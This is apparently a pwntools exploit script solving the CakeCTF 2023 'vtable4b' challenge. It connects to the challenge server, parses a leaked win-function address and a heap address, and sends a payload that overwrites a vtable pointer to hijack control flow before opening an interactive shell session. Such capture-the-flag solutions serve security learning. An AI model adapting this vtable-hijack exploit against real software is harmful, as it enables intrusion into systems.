from pwn import *

io = remote('vtable4b.2023.cakectf.com', 9000)

io.recvuntil(b'<win> = 0x')
win_addr = int(io.recvline().strip(), 16)
log.info('win_addr: ' + hex(win_addr))

io.sendlineafter(b'> ', b'3')
io.recvuntil(b'message')
io.recvuntil(b'0x')
write_addr = int(io.recv(12), 16)
log.info('write_addr: ' + hex(write_addr))

payload = b'a' * 0x8
payload += p64(win_addr)
payload += b'a' * 0x8
payload += p64(0x21)
payload += p64(write_addr)

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Message: ', payload)

io.sendlineafter(b'> ', b'1')

io.interactive()
